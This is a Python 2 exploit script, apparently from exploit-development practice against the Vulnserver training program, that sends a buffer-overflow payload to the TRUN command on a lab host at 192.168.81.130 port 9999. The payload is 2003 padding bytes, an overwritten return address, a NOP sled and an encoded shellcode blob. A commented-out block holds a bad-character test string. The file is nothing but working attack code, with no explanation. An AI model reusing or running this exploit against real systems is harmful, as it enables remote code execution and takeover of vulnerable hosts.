#!/usr/bin/python
import sys, socket

overflow = ("\xbd\x28\xe4\xba\xbc\xdd\xc1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x6a\x12\x03\x6a\x12\x83\xc2\x18\x58\x49\xee\x09\x1f"
"\xb2\x0e\xca\x40\x3a\xeb\xfb\x40\x58\x78\xab\x70\x2a\x2c\x40"
"\xfa\x7e\xc4\xd3\x8e\x56\xeb\x54\x24\x81\xc2\x65\x15\xf1\x45"
"\xe6\x64\x26\xa5\xd7\xa6\x3b\xa4\x10\xda\xb6\xf4\xc9\x90\x65"
"\xe8\x7e\xec\xb5\x83\xcd\xe0\xbd\x70\x85\x03\xef\x27\x9d\x5d"
"\x2f\xc6\x72\xd6\x66\xd0\x97\xd3\x31\x6b\x63\xaf\xc3\xbd\xbd"
"\x50\x6f\x80\x71\xa3\x71\xc5\xb6\x5c\x04\x3f\xc5\xe1\x1f\x84"
"\xb7\x3d\x95\x1e\x1f\xb5\x0d\xfa\xa1\x1a\xcb\x89\xae\xd7\x9f"
"\xd5\xb2\xe6\x4c\x6e\xce\x63\x73\xa0\x46\x37\x50\x64\x02\xe3"
"\xf9\x3d\xee\x42\x05\x5d\x51\x3a\xa3\x16\x7c\x2f\xde\x75\xe9"
"\x9c\xd3\x85\xe9\x8a\x64\xf6\xdb\x15\xdf\x90\x57\xdd\xf9\x67"
"\x97\xf4\xbe\xf7\x66\xf7\xbe\xde\xac\xa3\xee\x48\x04\xcc\x64"
"\x88\xa9\x19\x2a\xd8\x05\xf2\x8b\x88\xe5\xa2\x63\xc2\xe9\x9d"
"\x94\xed\x23\xb6\x3f\x14\xa4\x79\x17\x47\xb4\x12\x6a\x67\xa5"
"\xbe\xe3\x81\xaf\x2e\xa2\x1a\x58\xd6\xef\xd0\xf9\x17\x3a\x9d"
"\x3a\x93\xc9\x62\xf4\x54\xa7\x70\x61\x95\xf2\x2a\x24\xaa\x28"
"\x42\xaa\x39\xb7\x92\xa5\x21\x60\xc5\xe2\x94\x79\x83\x1e\x8e"
"\xd3\xb1\xe2\x56\x1b\x71\x39\xab\xa2\x78\xcc\x97\x80\x6a\x08"
"\x17\x8d\xde\xc4\x4e\x5b\x88\xa2\x38\x2d\x62\x7d\x96\xe7\xe2"
"\xf8\xd4\x37\x74\x05\x31\xce\x98\xb4\xec\x97\xa7\x79\x79\x10"
"\xd0\x67\x19\xdf\x0b\x2c\x39\x02\x99\x59\xd2\x9b\x48\xe0\xbf"
"\x1b\xa7\x27\xc6\x9f\x4d\xd8\x3d\xbf\x24\xdd\x7a\x07\xd5\xaf"
"\x13\xe2\xd9\x1c\x13\x27")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

# badchars = (
#   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
#   "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
#   "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
#   "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
#   "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
#   "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
#   "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
#   "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
#   "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
#   "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
#   "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
#   "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
#   "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
#   "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
#   "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
#   "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
# )

# shellcode = "A"*2003 + "\xaf\x11\x50\x62" + badchars

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.81.130',9999))

    s.send(('TRUN /.:/'+ shellcode))
    s.close()
    
except:
    print "Error connecting to server"
    sys.exit()